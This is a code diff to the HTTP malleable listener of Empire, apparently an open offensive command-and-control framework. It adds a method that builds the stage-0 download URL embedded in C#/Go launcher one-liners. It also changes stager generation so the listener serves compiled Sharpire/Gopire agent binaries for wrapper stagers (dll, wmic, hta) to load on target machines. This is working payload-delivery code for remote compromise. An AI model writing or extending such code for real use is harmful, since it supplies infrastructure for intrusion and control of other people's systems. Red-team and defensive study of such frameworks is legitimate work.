@@ -21,7 +21,10 @@ from empire.server.common.empire import MainMenu
 from empire.server.common.encryption import AESCipher
 from empire.server.core.db import models
 from empire.server.core.db.base import SessionLocal
-from empire.server.core.exceptions import ListenerValidationException
+from empire.server.core.exceptions import (
+    ListenerValidationException,
+    ModuleExecutionException,
+)
 from empire.server.utils import data_util, listener_util, log_util
 
 LOG_NAME_PREFIX = __name__
@@ -283,6 +286,30 @@ class Listener:
         return base64.b64encode(profile.serialize_for_agent().encode("utf-8")).decode(
             "utf-8"
         )
+
+    def stager_url(self) -> str:
+        """URL the C#/Go launcher one-liner should hit for stage 0.
+
+        Pulls from profile.stager.client.uris so stage 0 reaches the
+        listener's stager dispatch (which returns the SharpireMalleable /
+        Gopire binary), not the post URI that DefaultProfile happens to
+        carry. Joined with host_address so the result is a complete URL
+        ready to embed in the launcher.
+
+        Raises RuntimeError when host_address is not yet set — silently
+        returning a string like "None/init/" would embed an
+        "http://None/..." download URL into the launcher template and
+        fail silently on target.
+        """
+        if self.host_address is None:
+            raise RuntimeError(
+                f"stager_url() called before host_address is set on listener "
+                f"{self.options['Name']['Value']!r}; listener may not be started"
+            )
+        profile = malleable.Profile._deserialize(self.serialized_profile)
+        uris = profile.stager.client.uris or ["/"]
+        uri = secrets.choice(uris)
+        return f"{self.host_address}{uri.lstrip('/')}"
 
     def generate_launcher(
         self,
@@ -799,9 +826,28 @@ class Listener:
             return stager
 
         if language.lower() in ("csharp", "go"):
-            # csharp (Sharpire) and go (Gopire) are stageless — the compiled
-            # binary produced in generate_launcher() IS the stage.
-            return ""
+            # Wrapper stagers (dll, wmic, hta, …) embed a launcher one-liner
+            # that hits this URI and expects binary bytes back; mirror
+            # http.py:866-880. Raise loudly on missing binary so we never
+            # silently serve zero bytes (which would Assembly.Load to an
+            # opaque .NET error on target with no server-side signal).
+            binary_path = self.generate_launcher(
+                language=language.lower(),
+                listener_name=self.options["Name"]["Value"],
+                obfuscate=obfuscate,
+                obfuscation_command=obfuscation_command,
+                encode=False,
+            )
+            if not binary_path:
+                msg = (
+                    f"http_malleable generate_stager: generate_launcher returned no "
+                    f"binary for language={language!r} on listener "
+                    f"{self.options['Name']['Value']!r}; stage 0 cannot be served."
+                )
+                self.instance_log.error(msg)
+                log.error(msg)
+                raise ModuleExecutionException(msg)
+            return Path(binary_path).read_bytes()
 
         log.error(
             "listeners/http_malleable generate_stager(): invalid language specification, only 'powershell', 'python', 'csharp', and 'go' are currently supported for this module."
